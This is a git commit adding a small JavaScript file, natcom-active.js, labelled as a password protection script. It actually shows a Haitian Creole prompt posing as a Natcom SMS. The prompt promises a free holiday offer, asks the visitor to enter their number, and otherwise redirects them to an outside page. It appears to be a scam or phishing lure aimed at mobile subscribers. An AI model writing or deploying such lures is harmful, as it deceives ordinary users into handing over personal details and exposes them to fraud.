b684a9234bbd6698be65141d4a1079fe7fd0a062
itidnewblog4 <ukpehaitid2@gmail.com>
2025-12-25 11:11:06 +0100

    Create natcom-active.js

---
+++ natcom-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'AKTIVE DONE GRATIS'
+password = prompt(
+  'SMS: Felisitasyon! Nimewo Natcom ou an kalifye pou resevwa òf Nwèl ak nouvèl ane a. Tanpri peze OK pou antre nimewo ou an..',
+  'AKTIVE DONE GRATIS'
+);
+if (password != 'AKTIVE DONE GRATIS') {
+  location.href = 'https://phlug.org/natcom.html';
+}
